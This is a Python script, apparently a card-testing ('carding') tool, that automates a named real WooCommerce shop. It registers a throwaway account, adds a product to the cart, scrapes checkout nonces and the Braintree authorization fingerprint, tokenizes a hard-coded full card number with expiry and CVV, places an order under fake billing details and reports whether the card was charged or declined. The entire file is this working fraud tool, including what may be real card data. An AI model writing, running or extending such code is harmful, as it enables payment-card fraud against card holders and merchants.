"""
CHARGE_DEBUG.py - Detailed debugging version with full response output
"""

import asyncio
import base64
import re
import random
import uuid
from typing import Optional, Tuple
import aiohttp

# Simple card class
class Card:
    def __init__(self, number, month, year, cvv):
        self.number = number
        self.month = month
        self.year = year
        self.cvv = cvv
    
    def masked(self):
        return f"{self.number[:6]}******{self.number[-4:]}"

HEADERS = {
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
}

def extract(pattern, text):
    """Extract using regex."""
    match = re.search(pattern, text, re.IGNORECASE | re.DOTALL)
    if match:
        for i in range(1, len(match.groups()) + 1):
            if match.group(i):
                return match.group(i)
    return None

async def test_site(url: str, card: Card):
    """Test site with detailed output."""
    print("\n" + "=" * 80)
    print(f"TESTING: {url}")
    print("=" * 80)
    
    connector = aiohttp.TCPConnector(limit=100)
    timeout = aiohttp.ClientTimeout(total=120)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout, cookie_jar=aiohttp.CookieJar()) as session:
        
        # =================================================================
        # STEP 1: REGISTER
        # =================================================================
        print("\n[STEP 1] Registration")
        print("-" * 80)
        try:
            async with session.get(f'https://{url}/my-account/', headers=HEADERS) as resp:
                page = await resp.text()
                print(f"GET /my-account/ → Status: {resp.status}")
                print(f"Response size: {len(page)} bytes")
                
                nonce = extract(r'name=["\']woocommerce-register-nonce["\'][^>]*value=["\']([^"\']+)', page)
                print(f"Registration nonce: {nonce[:30] if nonce else 'NOT FOUND'}...")
                
                if not nonce:
                    print("❌ Cannot register - no nonce")
                    return
                
                email = f"user{random.randint(10000, 99999)}@gmail.com"
                data = f"email={email}&woocommerce-register-nonce={nonce}&_wp_http_referer=%2Fmy-account%2F&register=Register"
                
                headers = HEADERS.copy()
                headers['content-type'] = 'application/x-www-form-urlencoded'
                headers['referer'] = f'https://{url}/my-account/'
                
                async with session.post(f'https://{url}/my-account/', headers=headers, data=data) as reg_resp:
                    reg_text = await reg_resp.text()
                    print(f"POST /my-account/ → Status: {reg_resp.status}")
                    
                    if 'logout' in reg_text.lower() or 'dashboard' in reg_text.lower():
                        print(f"✓ Registered: {email}")
                    else:
                        print("❌ Registration failed")
                        print(f"Response snippet: {reg_text[:500]}")
                        return
        
        except Exception as e:
            print(f"❌ Registration error: {e}")
            return
        
        await asyncio.sleep(1)
        
        # =================================================================
        # STEP 2: FIND PRODUCTS
        # =================================================================
        print("\n[STEP 2] Finding Products")
        print("-" * 80)
        
        shop_urls = [
            f'https://{url}/shop/',
            f'https://{url}/products/',
            f'https://{url}/store/',
        ]
        
        products_found = []
        shop_page = None
        
        for shop_url in shop_urls:
            try:
                print(f"Trying: {shop_url}")
                async with session.get(shop_url, headers=HEADERS) as resp:
                    if resp.status == 200:
                        shop_page = await resp.text()
                        print(f"  Status: {resp.status} | Size: {len(shop_page)} bytes")
                        
                        # Check for products
                        product_count = shop_page.lower().count('product')
                        add_to_cart_count = shop_page.lower().count('add-to-cart')
                        print(f"  'product' mentions: {product_count}")
                        print(f"  'add-to-cart' mentions: {add_to_cart_count}")
                        
                        if product_count > 5 or add_to_cart_count > 0:
                            print(f"  ✓ This looks like a shop page!")
                            break
                    else:
                        print(f"  Status: {resp.status} (skip)")
            except Exception as e:
                print(f"  Error: {e}")
        
        if not shop_page:
            print("❌ No shop page found")
            return
        
        # Extract product IDs from add-to-cart buttons
        product_ids = re.findall(r'add-to-cart[="\s]+(\d+)', shop_page, re.IGNORECASE)
        product_ids = list(set(product_ids))[:5]  # Unique, max 5
        
        print(f"\nFound {len(product_ids)} product IDs: {product_ids}")
        
        if not product_ids:
            print("❌ No product IDs found")
            # Try to extract product links
            product_links = re.findall(r'href=["\']([^"\']*product[^"\']+)["\']', shop_page)[:3]
            print(f"Product links found: {len(product_links)}")
            for link in product_links[:3]:
                print(f"  - {link}")
            return
        
        # Select first product
        product_id = product_ids[0]
        print(f"\n✓ Selected product ID: {product_id}")
        
        await asyncio.sleep(1)
        
        # =================================================================
        # STEP 3: ADD TO CART
        # =================================================================
        print("\n[STEP 3] Add to Cart")
        print("-" * 80)
        
        try:
            cart_url = f'https://{url}/?add-to-cart={product_id}'
            print(f"Adding: {cart_url}")
            
            headers = HEADERS.copy()
            headers['referer'] = f'https://{url}/shop/'
            
            async with session.get(cart_url, headers=headers) as resp:
                cart_resp = await resp.text()
                print(f"Status: {resp.status}")
                print(f"Response size: {len(cart_resp)} bytes")
                
                # Check cart
                async with session.get(f'https://{url}/cart/', headers=HEADERS) as cart_check:
                    cart_page = await cart_check.text()
                    
                    if 'cart-empty' in cart_page.lower():
                        print("❌ Cart is empty")
                        print(f"Cart page snippet: {cart_page[:500]}")
                        return
                    elif product_id in cart_page:
                        print(f"✓ Product {product_id} in cart!")
                    else:
                        print("⚠ Cart status unclear, continuing...")
        
        except Exception as e:
            print(f"❌ Add to cart error: {e}")
            return
        
        await asyncio.sleep(1)
        
        # =================================================================
        # STEP 4: CHECKOUT & GET TOKEN
        # =================================================================
        print("\n[STEP 4] Checkout & Extract Token")
        print("-" * 80)
        
        try:
            headers = HEADERS.copy()
            headers['referer'] = f'https://{url}/cart/'
            
            async with session.get(f'https://{url}/checkout/', headers=headers) as resp:
                checkout_page = await resp.text()
                print(f"GET /checkout/ → Status: {resp.status}")
                print(f"Response size: {len(checkout_page)} bytes")
                
                # Check for braintree
                bt_count = checkout_page.lower().count('braintree')
                print(f"'braintree' mentions: {bt_count}")
                
                if bt_count == 0:
                    print("❌ No Braintree on checkout page")
                    return
                
                # Try to extract embedded token
                token_pattern = r'wc_braintree_client_token["\']?\s*[=:]\s*["\']?([A-Za-z0-9+/=]{100,})'
                token = extract(token_pattern, checkout_page)
                
                if token:
                    print(f"✓ Found embedded token: {token[:50]}...")
                    try:
                        decoded = base64.b64decode(token).decode('utf-8')
                        auth = extract(r'"authorizationFingerprint"\s*:\s*"([^"]+)"', decoded)
                        if auth:
                            print(f"✓ Authorization fingerprint: {auth[:50]}...")
                        else:
                            print("❌ No auth fingerprint in token")
                            return
                    except Exception as e:
                        print(f"❌ Token decode failed: {e}")
                        return
                else:
                    print("⚠ No embedded token, trying AJAX...")
                    
                    # Try AJAX
                    cnonce = extract(r'"client_token_nonce"\s*:\s*"([^"]+)"', checkout_page)
                    if cnonce:
                        print(f"✓ Found client_token_nonce: {cnonce[:20]}...")
                        
                        ajax_data = f"action=wc_braintree_credit_card_get_client_token&nonce={cnonce}"
                        ajax_headers = HEADERS.copy()
                        ajax_headers['content-type'] = 'application/x-www-form-urlencoded'
                        ajax_headers['x-requested-with'] = 'XMLHttpRequest'
                        
                        try:
                            async with session.post(f'https://{url}/wp-admin/admin-ajax.php', 
                                                   headers=ajax_headers, data=ajax_data) as ajax_resp:
                                ajax_text = await ajax_resp.text()
                                print(f"POST /wp-admin/admin-ajax.php → Status: {ajax_resp.status}")
                                print(f"AJAX response: {ajax_text[:200]}")
                                
                                data_token = extract(r'"data"\s*:\s*"([^"]+)"', ajax_text)
                                if data_token:
                                    decoded = base64.b64decode(data_token).decode('utf-8')
                                    auth = extract(r'"authorizationFingerprint"\s*:\s*"([^"]+)"', decoded)
                                    if auth:
                                        print(f"✓ Got auth from AJAX: {auth[:50]}...")
                                    else:
                                        print("❌ No auth in AJAX response")
                                        return
                                else:
                                    print("❌ No data token in AJAX")
                                    return
                        except Exception as e:
                            print(f"❌ AJAX failed: {e}")
                            return
                    else:
                        print("❌ No client_token_nonce for AJAX")
                        return
                
                # Extract checkout nonce
                checkout_nonce = extract(r'name=["\']woocommerce-process-checkout-nonce["\'][^>]*value=["\']([^"\']+)', checkout_page)
                if not checkout_nonce:
                    checkout_nonce = extract(r'"woocommerce-process-checkout-nonce"\s*:\s*"([^"]+)"', checkout_page)
                
                print(f"Checkout nonce: {checkout_nonce[:30] if checkout_nonce else 'NOT FOUND'}...")
                
                if not checkout_nonce:
                    print("❌ No checkout nonce")
                    return
        
        except Exception as e:
            print(f"❌ Checkout error: {e}")
            return
        
        await asyncio.sleep(1)
        
        # =================================================================
        # STEP 5: TOKENIZE CARD
        # =================================================================
        print("\n[STEP 5] Tokenize Card with Braintree")
        print("-" * 80)
        
        try:
            bt_headers = {
                'content-type': 'application/json',
                'authorization': f'Bearer {auth}',
                'braintree-version': '2018-05-10',
            }
            
            payload = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'dropin2',
                    'sessionId': str(uuid.uuid4())
                },
                'query': '''
                    mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                        tokenizeCreditCard(input: $input) {
                            token
                            creditCard { bin brandCode last4 }
                        }
                    }
                ''',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': card.number,
                            'expirationMonth': card.month,
                            'expirationYear': card.year,
                            'cvv': card.cvv,
                            'cardholderName': 'John Doe',
                            'billingAddress': {'postalCode': '10001'}
                        },
                        'options': {'validate': False}
                    }
                },
                'operationName': 'TokenizeCreditCard'
            }
            
            print(f"Tokenizing card: {card.masked()}")
            
            async with session.post('https://payments.braintree-api.com/graphql', 
                                   headers=bt_headers, json=payload) as resp:
                bt_resp = await resp.text()
                print(f"POST braintree-api.com/graphql → Status: {resp.status}")
                print(f"Response: {bt_resp[:300]}")
                
                payment_token = extract(r'"token"\s*:\s*"([^"]+)"', bt_resp)
                brand = extract(r'"brandCode"\s*:\s*"([^"]+)"', bt_resp) or 'master-card'
                
                if payment_token:
                    print(f"✓ Payment token: {payment_token[:50]}...")
                    print(f"✓ Brand: {brand}")
                else:
                    print("❌ No payment token")
                    return
        
        except Exception as e:
            print(f"❌ Tokenization error: {e}")
            return
        
        await asyncio.sleep(1)
        
        # =================================================================
        # STEP 6: PLACE ORDER
        # =================================================================
        print("\n[STEP 6] Place Order")
        print("-" * 80)
        
        try:
            data = (
                f"billing_first_name=John&"
                f"billing_last_name=Doe&"
                f"billing_company=TestCo&"
                f"billing_country=US&"
                f"billing_address_1=123+Main+St&"
                f"billing_city=New+York&"
                f"billing_state=NY&"
                f"billing_postcode=10001&"
                f"billing_phone=12125551234&"
                f"billing_email=test{random.randint(1000,9999)}@gmail.com&"
                f"payment_method=braintree_credit_card&"
                f"wc-braintree-credit-card-card-type={brand}&"
                f"wc_braintree_credit_card_payment_nonce={payment_token}&"
                f"woocommerce-process-checkout-nonce={checkout_nonce}&"
                f"_wp_http_referer=%2Fcheckout%2F"
            )
            
            headers = HEADERS.copy()
            headers['content-type'] = 'application/x-www-form-urlencoded'
            headers['referer'] = f'https://{url}/checkout/'
            
            print(f"Submitting order...")
            
            async with session.post(f'https://{url}/?wc-ajax=checkout', 
                                   headers=headers, data=data) as resp:
                final_text = await resp.text()
                final_url = str(resp.url)
                
                print(f"POST /?wc-ajax=checkout → Status: {resp.status}")
                print(f"Final URL: {final_url}")
                print(f"Response size: {len(final_text)} bytes")
                print(f"\nResponse content (first 800 chars):")
                print("-" * 80)
                print(final_text[:800])
                print("-" * 80)
                
                # Check result
                final_lower = final_text.lower()
                
                if any(msg in final_lower for msg in ['thank you', 'order received', 'order complete']):
                    print("\n✅ ORDER PLACED SUCCESSFULLY!")
                elif any(msg in final_lower for msg in ['declined', 'invalid', 'error']):
                    print("\n❌ ORDER DECLINED")
                else:
                    print("\n⚠ UNKNOWN RESULT")
        
        except Exception as e:
            print(f"❌ Order placement error: {e}")
            return
        
        print("\n" + "=" * 80)
        print("TEST COMPLETE")
        print("=" * 80)

async def main():
    """Main test."""
    print("=" * 80)
    print("CHARGE DEBUG - Full Response Tester")
    print("=" * 80)
    
    # Test sites
    sites = [
        'djcity.com.au',
        # Add more sites to test
    ]
    
    card = Card('5403850087142766', '11', '2028', '427')
    print(f"Card: {card.masked()} | {card.month}/{card.year}\n")
    
    for site in sites:
        await test_site(site, card)
        await asyncio.sleep(3)

if __name__ == "__main__":
    asyncio.run(main())
